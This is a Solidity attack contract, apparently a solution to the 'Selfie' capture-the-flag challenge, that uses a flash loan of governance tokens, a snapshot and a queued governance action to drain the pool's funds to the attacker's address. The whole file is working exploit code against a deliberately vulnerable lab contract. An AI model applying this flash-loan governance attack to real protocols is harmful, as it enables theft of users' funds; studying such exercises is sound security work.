import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SelfiePool pool;
    DamnValuableTokenSnapshot public governanceToken;
    address owner;

    constructor(
        address poolAddress,
        address governanceTokenAddress,
        address _owner
    ) {
        pool = SelfiePool(poolAddress);
        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
        owner = _owner;
    }

    function attack() public {
        uint256 amountToBorrow = pool.token().balanceOf(address(pool));
        pool.flashLoan(amountToBorrow);
    }

    function receiveTokens(address token, uint256 amount) external {
        governanceToken.snapshot();
        pool.governance().queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        governanceToken.transfer(address(pool), amount);
    }
}
